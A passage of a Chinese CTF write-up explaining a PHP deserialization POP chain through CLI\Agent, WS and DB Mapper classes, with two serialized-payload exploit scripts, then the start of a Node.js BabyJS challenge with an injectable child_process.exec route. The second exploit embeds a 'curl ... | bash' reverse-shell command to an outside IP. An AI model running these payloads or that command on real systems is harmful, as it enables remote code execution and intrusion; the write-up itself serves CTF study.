+<p>因此我们只能换方向——<strong>寻找魔术方法</strong>，满足现在情况下的方法有<code>__call、__callStatic</code>（大概。</p>
+<p>全局搜索，果然找到<code>__call</code>和<code>__callStatic</code>，且大多都含有敏感函数<code>call_user_func_array</code>，再寻找哪个有可控参数，最后找到<code>DB\SQL\Mapper</code></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">call_user_func_array</span><span class="p">(</span>
+        <span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">props</span><span class="p">)</span><span class="o">?</span>
+         <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">props</span><span class="p">[</span><span class="nv">$func</span><span class="p">]</span><span class="o">:</span>
+         <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$func</span><span class="p">),</span><span class="nv">$args</span>
+    <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><code>$this-&gt;props</code>和<code>$func</code>都是可控的，因此通过修改变量就可以调用任意函数。接下来的问题就是如何触发<code>__call</code>，众所周知，触发<code>__call</code>需要调用当前类不存在的方法，但是Agent析构函数的<code>$func($this)</code>似乎已经限制了作用域的选择，所以即使通过传入数组绕过<code>is_callable</code>的判断还是无法成功触发别的作用域中的<code>__call</code>，最终还是要在Agent中寻找触发点，也就是符合<code>$class-&gt;$func($args)</code>的格式，然后找到了fetch方法：</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">fetch</span><span class="p">()</span> <span class="p">{</span>
+    <span class="c1">// Unmask payload
+</span><span class="c1"></span>    <span class="nv">$server</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">is_bool</span><span class="p">(</span><span class="nv">$buf</span><span class="o">=</span><span class="nv">$server</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">socket</span><span class="p">)))</span>
+        <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span>
+    <span class="o">...</span>
+<span class="p">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>Mapper不存在read方法，控制server和socket就可以触发<code>__call</code>实现任意命令执行。</p>
+<p>接下来就是调用fetch函数：</p>
+<blockquote>
+<p><code>is_callable</code>的<a href="https://www.php.net/manual/zh/function.is-callable.php" target="_blank" rel="noopener">语法</a>：</p>
+<p>检查的变量可以传入数组，且有效的检查变量应该包含两个元素，第一个是一个对象或者字符，第二个元素是个字符。</p>
+</blockquote>
+<p>正常来说<code>is_callable</code>的判断环境是当前环境，但是这里使用的是events数组，环境限制在了其他类，所以直接进行fetch判断肯定无法通过，需要传入数组将环境还原回Agent。传入数组的载体正如文章<a href="https://xz.aliyun.com/t/9220" target="_blank" rel="noopener">从WMCTF2020 webweb学反序列化</a>中所说可以替换，不过必须是框架中存在的类。至于为什么不用<code>CLI\WS</code>，我的理解是该类中的events数组属性已经定义为了<strong>protected</strong>，在<code>$this-&gt;server-&gt;events['disconnect']</code>访问时会报错<code>Uncaught Error: Cannot access protected property CLI\WS::$events</code>，不支持这样跨类访问。</p>
+<p>最后就是如何加载ws.php，查看base.php关于加载文件的函数：</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">protected</span> <span class="k">function</span> <span class="nf">autoload</span><span class="p">(</span><span class="nv">$class</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$class</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fixslashes</span><span class="p">(</span><span class="nx">ltrim</span><span class="p">(</span><span class="nv">$class</span><span class="p">,</span><span class="s1">&#39;\\&#39;</span><span class="p">));</span>
+    <span class="sd">/** @var callable $func */</span>
+    <span class="nv">$func</span><span class="o">=</span><span class="k">NULL</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$path</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hive</span><span class="p">[</span><span class="s1">&#39;AUTOLOAD&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
+        <span class="nx">isset</span><span class="p">(</span><span class="nv">$path</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$path</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
+        <span class="k">list</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="nv">$func</span><span class="p">)</span><span class="o">=</span><span class="nv">$path</span><span class="p">;</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">split</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hive</span><span class="p">[</span><span class="s1">&#39;PLUGINS&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="o">.</span><span class="nv">$path</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$auto</span><span class="p">)</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$func</span> <span class="o">&amp;&amp;</span> <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nv">$func</span><span class="p">(</span><span class="nv">$auto</span><span class="o">.</span><span class="nv">$class</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">)</span> <span class="o">||</span>
+            <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nv">$auto</span><span class="o">.</span><span class="nv">$class</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">)</span> <span class="o">||</span>
+            <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nv">$auto</span><span class="o">.</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$class</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">)</span> <span class="o">||</span>
+            <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$auto</span><span class="o">.</span><span class="nv">$class</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">))</span>
+            <span class="k">return</span> <span class="k">require</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>根据命名空间拆分成路径拼接php判断文件是否存在，所以我们需要使用<code>CLI\WS</code>加载ws.php文件。</p>
+<p>exp</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">namespace</span> <span class="nx">DB\SQL</span> <span class="p">{</span>
+	<span class="k">class</span> <span class="nc">Mapper</span> <span class="p">{</span>
+		<span class="k">protected</span> <span class="nv">$props</span><span class="p">;</span>
+
+		<span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$props</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">props</span> <span class="o">=</span> <span class="nv">$props</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="nx">CLI</span> <span class="p">{</span>
+	<span class="k">class</span> <span class="nc">Agent</span> <span class="p">{</span>
+		<span class="k">protected</span> <span class="nv">$server</span><span class="p">,</span> <span class="nv">$socket</span><span class="p">;</span>
+
+	    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$server</span><span class="p">,</span> <span class="nv">$socket</span><span class="p">)</span> <span class="p">{</span>
+	        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span> <span class="o">=</span> <span class="nv">$server</span><span class="p">;</span>
+	        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">socket</span> <span class="o">=</span> <span class="nv">$socket</span><span class="p">;</span>
+    	<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">class</span> <span class="nc">WS</span> <span class="p">{</span>
+		<span class="k">protected</span> <span class="nv">$events</span><span class="p">;</span>
+
+		<span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span> <span class="o">=</span> <span class="nv">$events</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="p">{</span>
+	<span class="k">class</span> <span class="nc">Session</span> <span class="p">{</span>
+		<span class="k">public</span> <span class="nv">$events</span><span class="p">;</span>
+
+		<span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span> <span class="o">=</span> <span class="nv">$events</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+
+	<span class="nv">$mapper</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DB\SQL\Mapper</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;system&#39;</span><span class="p">));</span>
+	<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CLI\Agent</span><span class="p">(</span><span class="nv">$mapper</span><span class="p">,</span><span class="s1">&#39;cat /etc/flagzaizheli&#39;</span><span class="p">);</span>
+	<span class="nv">$t</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Session</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;disconnect&#39;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="s1">&#39;fetch&#39;</span><span class="p">)));</span>
+	<span class="nv">$agent</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CLI\Agent</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+	<span class="nv">$load</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CLI\WS</span><span class="p">(</span><span class="nv">$agent</span><span class="p">);</span>
+	<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$load</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h3 id="方法二官方"><a href="#方法二官方" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:方法二官方" class="headings">方法二(官方)</a></h3>
+<p>官方选择的<code>__call</code>函数触发点与上面不同，是从<code>DB\Mongo\Mapper</code>的insert函数触发，不过最终还是要通过<code>DB\SQL\Mapper</code>的<code>__call</code>方法实现任意命令执行。</p>
+<blockquote>
+<p>定义的DB\Mongo类还是为了提供一个可访问的events数组，改成其他以存在的类也可行</p>
+</blockquote>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> 
+<span class="k">namespace</span> <span class="nx">CLI</span><span class="p">{</span> 
+    <span class="k">class</span> <span class="nc">Agent</span> 
+    <span class="p">{</span> 
+        <span class="k">protected</span> <span class="nv">$server</span><span class="p">;</span> 
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$server</span><span class="p">)</span> 
+        <span class="p">{</span> 
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="o">=</span><span class="nv">$server</span><span class="p">;</span> 
+        <span class="p">}</span> 
+    <span class="p">}</span> 
+
+    <span class="k">class</span> <span class="nc">WS</span> <span class="p">{</span> <span class="p">}</span> 
+<span class="p">}</span> 
+<span class="k">namespace</span> <span class="nx">DB</span><span class="p">{</span> 
+    <span class="k">abstract</span> <span class="k">class</span> <span class="nc">Cursor</span>  <span class="k">implements</span> <span class="nx">\IteratorAggregate</span> <span class="p">{}</span> 
+    <span class="k">class</span> <span class="nc">Mongo</span> <span class="p">{</span> 
+        <span class="k">public</span> <span class="nv">$events</span><span class="p">;</span> 
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">)</span> 
+        <span class="p">{</span> 
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span><span class="o">=</span><span class="nv">$events</span><span class="p">;</span> 
+        <span class="p">}</span> 
+    <span class="p">}</span> 
+<span class="p">}</span> 
+
+<span class="k">namespace</span> <span class="nx">DB\Mongo</span><span class="p">{</span> 
+    <span class="k">class</span> <span class="nc">Mapper</span> <span class="k">extends</span> <span class="nx">\DB\Cursor</span> <span class="p">{</span> 
+        <span class="k">protected</span> <span class="nv">$legacy</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> 
+        <span class="k">protected</span> <span class="nv">$collection</span><span class="p">;</span> 
+        <span class="k">protected</span> <span class="nv">$document</span><span class="p">;</span> 
+        <span class="k">function</span> <span class="nf">offsetExists</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
+        <span class="k">function</span> <span class="nf">offsetGet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
+        <span class="k">function</span> <span class="nf">offsetSet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">,</span> <span class="nv">$value</span><span class="p">){}</span> 
+        <span class="k">function</span> <span class="nf">offsetUnset</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
+        <span class="k">function</span> <span class="nf">getIterator</span><span class="p">(){}</span>     
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$collection</span><span class="p">,</span><span class="nv">$document</span><span class="p">){</span> 
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">collection</span><span class="o">=</span><span class="nv">$collection</span><span class="p">;</span> 
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">document</span><span class="o">=</span><span class="nv">$document</span><span class="p">;</span> 
+        <span class="p">}</span> 
+    <span class="p">}</span> 
+<span class="p">}</span> 
+<span class="k">namespace</span> <span class="nx">DB\SQL</span><span class="p">{</span> 
+    <span class="k">class</span> <span class="nc">Mapper</span> <span class="k">extends</span> <span class="nx">\DB\Cursor</span><span class="p">{</span> 
+        <span class="k">protected</span> <span class="nv">$props</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;insertone&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;system&#34;</span><span class="p">];</span> 
+        <span class="k">function</span> <span class="nf">offsetExists</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
+        <span class="k">function</span> <span class="nf">offsetGet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
+        <span class="k">function</span> <span class="nf">offsetSet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">,</span> <span class="nv">$value</span><span class="p">){}</span> 
+        <span class="k">function</span> <span class="nf">offsetUnset</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
+        <span class="k">function</span> <span class="nf">getIterator</span><span class="p">(){}</span> 
+    <span class="p">}</span> 
+<span class="p">}</span> 
+
+<span class="k">namespace</span><span class="p">{</span> 
+    <span class="nv">$SQLMapper</span><span class="o">=</span><span class="k">new</span> <span class="nx">DB\SQL\Mapper</span><span class="p">();</span> 
+    <span class="nv">$MongoMapper</span><span class="o">=</span><span class="k">new</span> <span class="nx">DB\Mongo\Mapper</span><span class="p">(</span><span class="nv">$SQLMapper</span><span class="p">,</span><span class="s2">&#34;curl https://shell.now.sh/39.106.207.66:2333 |bash&#34;</span><span class="p">);</span> 
+    <span class="nv">$DBMongo</span><span class="o">=</span><span class="k">new</span> <span class="nx">DB\Mongo</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;disconnect&#39;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="nv">$MongoMapper</span><span class="p">,</span><span class="s2">&#34;insert&#34;</span><span class="p">)));</span> 
+    <span class="nv">$Agent</span><span class="o">=</span><span class="k">new</span> <span class="nx">CLI\Agent</span><span class="p">(</span><span class="nv">$DBMongo</span><span class="p">);</span> 
+    <span class="nv">$WS</span><span class="o">=</span><span class="k">new</span> <span class="nx">CLI\WS</span><span class="p">();</span> 
+    <span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$WS</span><span class="p">,</span><span class="nv">$Agent</span><span class="p">)));</span>
+<span class="p">}</span> 
+</code></pre></td></tr></table></div>
+</div>
+</div><h2 id="网鼎杯-2020-半决赛babyjs"><a href="#网鼎杯-2020-半决赛babyjs" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:网鼎杯-2020-半决赛babyjs" class="headings">[网鼎杯 2020 半决赛]BabyJS</a></h2>
+<blockquote>
+<p>参考：</p>
+<p><a href="https://www.cnblogs.com/W4nder/p/14078695.html" target="_blank" rel="noopener">https://www.cnblogs.com/W4nder/p/14078695.html</a></p>
+</blockquote>
+<p>没用的代码分析了半天，一直在找<code>/login</code>的入口，绝了。。。</p>
+<p>关键代码就index.js</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">blacklist</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;127.0.0.1.xip.io&#39;</span><span class="p">,</span><span class="s1">&#39;::ffff:127.0.0.1&#39;</span><span class="p">,</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span><span class="s1">&#39;[::1]&#39;</span><span class="p">,</span><span class="s1">&#39;::1&#39;</span><span class="p">];</span>
+<span class="p">...</span>
+<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/debug&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">ip</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">blacklist</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">ip</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">){</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;res&#39;</span><span class="p">);</span>
+	<span class="kd">var</span> <span class="nx">u</span><span class="o">=</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[\&#34;\&#39;]/ig</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">u</span><span class="p">).</span><span class="nx">href</span><span class="p">);</span>
+	<span class="kd">let</span> <span class="nx">log</span><span class="o">=</span><span class="sb">`echo  &#39;</span><span class="si">${</span><span class="nx">url</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">u</span><span class="p">).</span><span class="nx">href</span><span class="si">}</span><span class="sb">&#39;&gt;&gt;/tmp/log`</span><span class="p">;</span>
+	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">log</span><span class="p">);</span>
+	<span class="nx">child_process</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">log</span><span class="p">);</span>
+	<span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="nx">data</span><span class="o">:</span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;/tmp/log&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()});</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({});</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+
+<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/debug&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
